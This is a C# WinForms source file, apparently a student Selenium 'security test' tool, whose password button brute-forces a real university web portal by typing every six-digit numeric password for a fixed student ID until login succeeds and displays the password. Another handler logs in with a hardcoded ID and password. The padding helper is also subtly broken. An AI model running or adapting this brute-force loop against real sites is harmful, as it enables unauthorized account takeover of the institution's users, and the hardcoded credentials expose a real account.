using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Web;

namespace SeleniumWiform
{
    
    public partial class frmBaoMat : Form
    {
        public frmBaoMat()
        {
            
            InitializeComponent();
        }

        private void kiểmTraChứcNăngToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmKTChucNang fr11 = new frmKTChucNang();
            this.Hide();
            fr11.Show();
        }

        private void kiểmTraBảoMậtToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }

        private void kiểmTraÁpLựcToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmKTApLuc frm = new frmKTApLuc();
            this.Hide();
            frm.Show();
        }

        private void btnClose_Click(object sender, EventArgs e)
        {

            Application.Exit();
        }

        private static Bitmap screenBitmap;
        private static Graphics screenGraphics;
         string XLMK(int a)
        {
            string b="";
            int x = a.ToString().Length;
            if(a.ToString().Length <6)
            {
                switch( x )
                {
                    case 0: b= "000000"+a.ToString(); break;
                    case 1: b = "00000" + a.ToString(); break;
                    case 2: b = "0000" + a.ToString(); break;
                    case 3: b = "000" + a.ToString(); break;
                    case 4: b = "0" + a.ToString(); break;
                    case 5: b =  a.ToString(); break;


                }

            }
            return b;
        }
        private void btnDoMK_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveDialog = new SaveFileDialog();
            // chọn đường dẫn lưu ảnh chụp màn hình
            saveDialog.Filter = "PNG Files (.png)|*.png|All Files (*.*)|*.*";
            saveDialog.FilterIndex = 1;
            //


            if (saveDialog.ShowDialog() == DialogResult.OK)
            {
                FirefoxDriver firefoxDriver;
                firefoxDriver = new FirefoxDriver();
                firefoxDriver.Manage().Window.Maximize();
                firefoxDriver.Url = "http://online.hcmute.edu.vn/";
                firefoxDriver.Navigate();

                // bắt sự kiện click vào button đăng nhập
                try
                {
                    // tìm đối tượng theo ID
                    var btnDangNhap = firefoxDriver.FindElementById("ctl00_lbtDangnhap");//đang cố ý để erro để bắt try cat
                                                                                         //click vào button đăng nhập
                    btnDangNhap.Click();
                }
                catch (Exception ex)
                {

                    DialogResult dlr = MessageBox.Show("Có lỗi, bạn có muốn tiếp tục. \n" + ex, "Thông báo", MessageBoxButtons.YesNo);

                    if (dlr == DialogResult.Yes)
                    {
                        // lưu ảnh chụp màn hình cuối cùng(đoạn này copy hoàn toàn trên Google)
                        screenBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                                    Screen.PrimaryScreen.Bounds.Height,
                                                    PixelFormat.Format32bppArgb);
                        screenGraphics = Graphics.FromImage(screenBitmap);
                        screenGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y,
                                                0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                        screenBitmap.Save(saveDialog.FileName, ImageFormat.Png);
                        
                        firefoxDriver.Quit(); //đóng cửa sổ trình duyệt vừa mở
                        frmKTChucNang fr1 = new frmKTChucNang();
                        fr1.Show();
                    }
                    else
                    {
                        firefoxDriver.Quit(); //đóng cửa sổ trình duyệt vừa mở
                        Application.Exit(); //đóng giao diện
                    }
                }
                try
                {
                    //tìm đến chỗ ô tên đăng nhập
                    var txtTenDangNhap = firefoxDriver.FindElementByXPath("//*[@id=\"ctl00_ContentPlaceHolder1_ctl00_ctl00_txtUserName\"]");
                    //gõ tên đăng nhập vào
                    txtTenDangNhap.SendKeys("15110231");

                    Thread.Sleep(1000); // ngủ 1 giây
                }
                catch (Exception ex1)
                {
                    DialogResult dlr = MessageBox.Show("Có lỗi, bạn có muốn tiếp tục. \n" + ex1, "Thông báo", MessageBoxButtons.YesNo);

                    if (dlr == DialogResult.Yes)
                    {
                        // lưu ảnh chụp màn hình cuối cùng(đoạn này copy hoàn toàn trên Google)
                        screenBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                                    Screen.PrimaryScreen.Bounds.Height,
                                                    PixelFormat.Format32bppArgb);
                        screenGraphics = Graphics.FromImage(screenBitmap);
                        screenGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y,
                                                0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                        screenBitmap.Save(saveDialog.FileName, ImageFormat.Png);
                        //đóng hoàn toàn ứng dụng
                        firefoxDriver.Quit(); //đóng cửa sổ trình duyệt vừa mở
                        frmKTChucNang fr1 = new frmKTChucNang();
                        fr1.Show();
                    }
                    else
                    {
                        firefoxDriver.Quit(); //đóng cửa sổ trình duyệt vừa mở
                        Application.Exit(); //đóng giao diện
                    }
                }
                int x = 0;
                while(x<999999)
                {
                    try
                    {
                        //tìm đến ô mật khẩu
                        var txtMK = firefoxDriver.FindElementByXPath("//*[@id=\"ctl00_ContentPlaceHolder1_ctl00_ctl00_txtPassword\"]");
                        //gõ mật khẩu vào
                        txtMK.SendKeys(XLMK(x));
                        //tìm đến button đăng nhập và nhấn vào nó
                        var btn1 = firefoxDriver.FindElementByXPath("//*[@id=\"ctl00_ContentPlaceHolder1_ctl00_ctl00_btLogin\"]");
                        btn1.Click();
                        //tìm đến chỗ THÔNG TIN CÁ NHÂN và nhấn vào nó
                        var btn2 = firefoxDriver.FindElementById("ctl00_ContentPlaceHolder1_ctl00_ctl00_lnkInfo");
                        btn2.Click();
                        firefoxDriver.Manage().Window.Minimize();
                        Thread.Sleep(2000);
                        MessageBox.Show("Mật khẩu là: "+XLMK(x));
                        
                        break;
                    }
                    catch(Exception er)
                    {
                        x++;
                    }
                }
            }

        }

        private void btnTrangChu_Click(object sender, EventArgs e)
        {
            FirefoxDriver ffDrv = new FirefoxDriver();
            ffDrv.Manage().Window.Maximize();
            ffDrv.Url = "http://online.hcmute.edu.vn/";
            ffDrv.Navigate();
            //tìm đến button ĐĂNG NHẬP và click
            var btnDangNhap = ffDrv.FindElementById("ctl00_lbtDangnhap");
            btnDangNhap.Click();

            //Tìm textbox TÊN ĐĂNG NHẬP và MẬT KHẨU và fill vào
            var txtUsername = ffDrv.FindElementById("ctl00_ContentPlaceHolder1_ctl00_ctl00_txtUserName");
            txtUsername.SendKeys("15110231");
            var txtPass = ffDrv.FindElementById("ctl00_ContentPlaceHolder1_ctl00_ctl00_txtPassword");
            txtPass.SendKeys("000030");

            //tìm label TRANG CHỦ và click nó
            var btn1 = ffDrv.FindElementByXPath("//*[@id=\"ctl00_ContentPlaceHolder1_ctl00_ctl00_btLogin\"]");
            btn1.Click();

            //Bấm vào label trang chủ thì đăng xuất tài khoản.
            var lbHome = ffDrv.FindElementById("ctl00_lbtHome");
            lbHome.Click();



        }

        private void kiểmTraBảoMậtToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmBaoMat frm = new frmBaoMat();
            this.Hide();
            frm.Show();
        }

        private void kiểmTraÁpLựcToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            frmKTApLuc frm = new frmKTApLuc();
            this.Hide();
            frm.Show();
        }

        private void thoátToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult dlr = MessageBox.Show("Bạn có chắc chắn muốn thoát !", "Thông báo",
               MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (dlr == DialogResult.Yes)
            {
                Application.Exit();
            }
        }

        private void kiểmTraTốcĐộToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmTocDo f = new frmTocDo();
            this.Hide();
            f.Show();
        }
      
      

        private void label2_Click(object sender, EventArgs e)
        {
            frmPlayVideo s = new frmPlayVideo();
            s.ShowDialog();
        }
    }
}
